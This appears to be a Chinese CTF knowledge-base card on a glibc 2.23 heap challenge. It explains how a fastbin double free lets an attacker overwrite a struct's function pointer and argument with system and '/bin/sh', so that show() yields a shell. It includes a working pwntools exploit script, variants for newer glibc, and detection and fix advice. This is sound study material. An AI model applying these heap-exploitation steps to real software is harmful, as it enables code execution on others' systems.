---
id: ctf-pwn-double-free-funcptr-table-freehook
title: 菜单堆题 double free 复用同一块：把函数指针表覆盖成 {"/bin/sh", system} 后由 show 间接调用拿 shell
type: scenario
domain: ctf
path: ctf/pwn
technique: double-free-function-pointer-table-hijack
aliases:
- double free 2.23 无 tcache
- 函数指针表劫持
- v4[1] 回调覆盖
- show 间接调用 getshell
tags:
- pwn
- heap
- double-free
- uaf
- function-pointer
- free-hook
- glibc-2.23
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-T2-3W10
  verified_at: '2026-11-09T04:48:31+08:00'
  notes: 已对照原文核对；本次核对未读取图片；add 中 malloc(8) 结构体+v4[1]=sub_80488E5、free 对 *dword 与 dword 各释放一次、show 走 (*(dword+4))(*dword)、PoC add(0x10)x3+dele(0)/dele(1)/dele(0)+add(0x8,binsh+system) 均与正文一致；注意 double free 实际由「同一索引未置空被 free 两次」达成，正文未明写结构体与其成员指针指向同一块，卡内触发条件该句表述偏松
---

## 一句话结论

程序 `add` 里执行 `v4 = malloc(8); v4[1] = 某个默认处理函数; *v4 = malloc(size)`，而 `show` 走 `(*(dword[idx]+4))(*dword[idx])` 间接调用；`free` 时对 `*dword[idx]` 和 `dword[idx]` 各 free 一次造成 double free，在无 tcache 的 glibc 2.23 下连续 free 同一块再申请同尺寸即可让两次分配返回同一地址，把 `{参数, 函数指针}` 覆盖成 `{"/bin/sh", system}`，`show` 即 `system("/bin/sh")`。

## 原理

- `free(*dword[c])` 与 `free(dword[c])` 连续释放，若两条路径指向同一块就形成 double free；glibc 2.23 的 fastbin 只检查“当前 free 的块是否等于最近一次 free 的块”，中间插一次别的 free 即可绕过。
- 结构体是 8 字节：前 4 字节存数据指针、后 4 字节存处理函数指针；`show` 用 fixup 后的结构体做 `call [结构体+4]`，参数是 `[结构体]`。这是一个天然的“可写函数指针 + 可控参数”原语。
- double free 让同一个 chunk 进入 fastbin 环，之后两次 `malloc(8)` 返回同一地址，第二次写入即覆盖第一次写入的结构体内容。
- 无需泄露任何地址：只要二进制里已有 `system` 调用点（如 `do_system`）和 `/bin/sh` 字符串，把函数指针指向 `system`、参数指向 `/bin/sh` 即可，属于“只改写数据”的利用。

## 触发条件

- glibc 2.23 以下无 tcache（或 tcache 已被填满，double free 落到 fastbin）。
- `free` 路径对同一指针 free 两次，或对“结构体”和“其成员指针”各 free 一次（本例）。
- 存在一个通过结构体成员间接调用的路径（`show`/`edit`/析构），且结构体可被重新分配。
- 二进制内有可用 `system` 入口和 `/bin/sh` 字符串（或可控参数）。

## 利用步骤

1. 逆向菜单，确认 `add` 分配 `8` 字节结构体并写入函数指针，`free` 两次释放同块，`show` 用 `[结构体]`/`[结构体+4]` 间接调用。
2. 用 FLIRT/特征匹配恢复 `system`、`do_system` 等符号地址（本例 libc6 2.23-0ubuntu10_i386）。
3. 申请 3 个同尺寸块 → `free(0); free(1); free(0)` 构成 double free。
4. `add` 一次拿回同一块，写入 `p32(binsh) + p32(system)`；随后 `show` 触发 `system("/bin/sh")`。

## PoC

```python
from pwn import *
context(arch='i386', os='linux')
p = process('./rhg7')

def cmd(i, prompt=b'2.show'):
    p.sendlineafter(prompt, str(i).encode())

def add(sz, cont=b'BBBBBBBB'):
    cmd(0); p.sendline(str(sz).encode()); p.send(cont)

def show(i):
    cmd(2); p.sendline(str(i).encode())

def dele(i):
    cmd(1); p.sendline(str(i).encode())

for _ in range(3):
    add(0x10)
dele(0); dele(1); dele(0)                      # fastbin double free

add(0x8, p32(0x80bcf4f) + p32(0x804f820))      # {"/bin/sh", system}
show(1)
p.interactive()
```

## 变体与关联

- 变体：结构体里的函数指针可换成 one_gadget、`do_system`、`system` 包装函数；参数槽可放 `/bin/sh` 指针或可控缓冲区地址。
- 变体：有 tcache（2.26+）时先填满对应 bin 再 free，让 double free 进入 fastbin；2.32+ 需先泄堆地址绕过 safe-linking。
- 关联：[[ctf-pwn-menu-uaf-heap-overflow-tcache-poison-freehook-system]]（UAF+堆溢出投毒 free_hook）、[[binary-pwn-heap-alloc-0x1c-edit-limit-0x28-chunk-funcptr-backdoor]]（块内函数指针劫持）。
- 边界：程序若在 `free` 后置空指针、或 free 前校验指针归属，则 double free 不成立；glibc 2.34+ 无 `__free_hook`，但本手法不依赖 hook。

## 检测与防御

- 检测：同一指针在两条路径上被 free；结构体里存函数指针并跨分配复用；`show` 对已释放块仍可调用。
- 修复：free 后 `dword[idx] = NULL`；`free` 前校验块属于当前菜单项；避免把函数指针与数据放在同一可复用块。
- 加固：升级 glibc（tcache double-free 检测）、开启 `MALLOC_CHECK_`/`glibc.malloc.tcache_count` 调试、地址随机化下仍需先泄堆。
